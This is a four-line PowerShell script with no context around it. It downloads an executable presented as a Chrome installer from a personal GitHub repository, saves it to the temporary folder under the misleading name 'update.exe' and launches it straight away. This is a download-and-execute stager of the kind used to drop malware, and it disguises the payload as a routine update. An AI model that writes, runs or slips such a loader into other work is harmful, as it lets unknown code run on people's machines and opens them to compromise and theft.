[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$client = New-Object System.Net.WebClient;
$client.DownloadFile("https://github.com/naruto3213213/111/raw/refs/heads/main/ChromeSetup.exe", "$env:TEMP\update.exe");
Start-Process "$env:TEMP\update.exe";